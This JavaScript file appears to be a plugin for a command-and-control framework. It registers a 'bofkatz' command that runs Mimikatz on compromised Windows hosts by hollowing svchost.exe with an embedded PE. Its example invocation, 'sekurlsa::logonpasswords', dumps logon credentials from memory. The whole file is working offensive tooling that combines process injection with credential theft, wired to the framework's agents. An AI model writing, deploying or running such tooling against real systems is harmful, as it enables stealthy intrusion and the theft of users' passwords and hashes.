var metadata = {
    name: "BOFKatz",
    description: "Mimikatz BOF via PE hollowing into svchost.exe. Requires high integrity / SYSTEM."
};

var cmd_bofkatz = ax.create_command(
    "bofkatz",
    "Execute mimikatz via BOF. Hollows svchost.exe with embedded katz PE. Requires elevated privileges.",
    "bofkatz sekurlsa::logonpasswords"
);

cmd_bofkatz.addArgBool("--async", "Run BOF asynchronously (recommended for long-running mimikatz commands)");
cmd_bofkatz.addArgString("arguments", false, "Mimikatz arguments (default: coffee exit)");

cmd_bofkatz.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
    let args = (parsed_json["arguments"] || "").trim();
    if (!args.endsWith("exit")) args = args ? args + " exit" : "coffee exit";
    let async = "";
    if (parsed_json["--async"]) async = "-a ";
    let bof_params = ax.bof_pack("cstr", [args]);
    let bof_path = ax.script_dir() + "BOFKatz." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "BOFKatz: mimikatz via PE hollowing");
});

var group = ax.create_commands_group("BOFKatz", [cmd_bofkatz]);

ax.register_commands_group(group, ["beacon", "gopher", "kharon"], ["windows"], []);
